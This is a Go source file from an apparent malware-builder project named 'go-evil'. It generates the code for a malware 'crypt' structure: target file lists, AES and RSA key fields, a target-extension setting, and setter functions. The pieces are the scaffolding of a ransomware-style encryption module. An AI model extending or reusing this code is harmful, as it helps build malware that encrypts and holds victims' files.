package structs

import (
	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
	"github.com/TeamPhoneix/go-evil/utility/structure/json"
	"github.com/TeamPhoneix/go-evil/utility/structure/structs"
)

// Generates the crypto struct (read rib) of the malware
func Generate_crypt(data_object *json.Json_t) {

	data_object.Add_go_struct(structs.Go_struct_t{
		Name: "crypt_t",
		Contents: []string{
			"method string",
			"target []string",
			"aes_key string",
			"aes_key_length int",
			"rsa_public rsa.PublicKey",
			"rsa_private *rsa.PrivateKey",
			"rsa_key_length int",
			"target_extension bool",
			"extension string",
		},
	})

	data_object.Add_go_function(functions.Go_func_t{Name: "set_crypto", Func_type: "", Part_of_struct: "crypt_t",
		Return_type: "", Parameters: []string{"value string"}, Gut: []string{"obj.method = value"}})

	data_object.Add_go_function(functions.Go_func_t{Name: "set_aes_key", Func_type: "", Part_of_struct: "crypt_t",
		Return_type: "", Parameters: []string{"value string"}, Gut: []string{"obj.aes_key = value", "obj.aes_key_length = len(value)"}})

	data_object.Add_go_function(functions.Go_func_t{Name: "set_rsa_key", Func_type: "", Part_of_struct: "crypt_t",
		Return_type: "", Parameters: []string{"private_key *rsa.PrivateKey", "key_length int"}, Gut: []string{
			"obj.rsa_private = private_key",
			"obj.rsa_public = private_key.PublicKey",
			"obj.rsa_key_length = key_length",
		}})

	data_object.Add_go_function(functions.Go_func_t{Name: "add_target", Func_type: "", Part_of_struct: "crypt_t",
		Return_type: "", Parameters: []string{"value string"}, Gut: []string{"obj.target = append(obj.target, value)"}})

	data_object.Add_go_import("crypto/rsa")

}
